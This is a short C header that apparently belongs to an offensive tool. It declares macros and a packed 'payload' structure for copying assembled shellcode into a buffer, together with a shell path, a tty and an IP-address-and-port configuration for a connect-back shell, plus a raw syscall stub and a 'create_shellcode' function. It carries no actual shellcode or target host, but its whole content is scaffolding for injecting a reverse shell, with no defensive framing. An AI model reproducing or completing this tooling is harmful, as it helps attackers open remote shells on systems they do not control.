#include <arpa/inet.h>

#define SHELLCODE(name) __asm__(#name"_end:"); \
	extern char name ## _end[];

#define SHELLCODE_PACK(payload, name) {\
        ssize_t shellcode_size = (void *)name ## _end - (void *)name; \
        memcpy(&(payload)->name, name, shellcode_size); \
}

#define offsetof(st, m) __builtin_offsetof(st, m)

long syscall_func(long number, ...);
extern char syscall_func_end[];

extern char call_shell[];
extern char call_shell_end[];

struct shell_config {
	struct in_addr sin_addr;
	uint16_t        sin_port;
}__attribute__ ((packed));

struct payload {
	char                 	shell[64];
	char                 	tty[64];
	struct shell_config     config;
	uint8_t                 shellcode[1024];
	uint8_t                 syscall_func[64];
        typeof(syscall_func)    *syscall;
	volatile uint8_t	done;
} __attribute__ ((packed));

int create_shellcode(struct payload *);
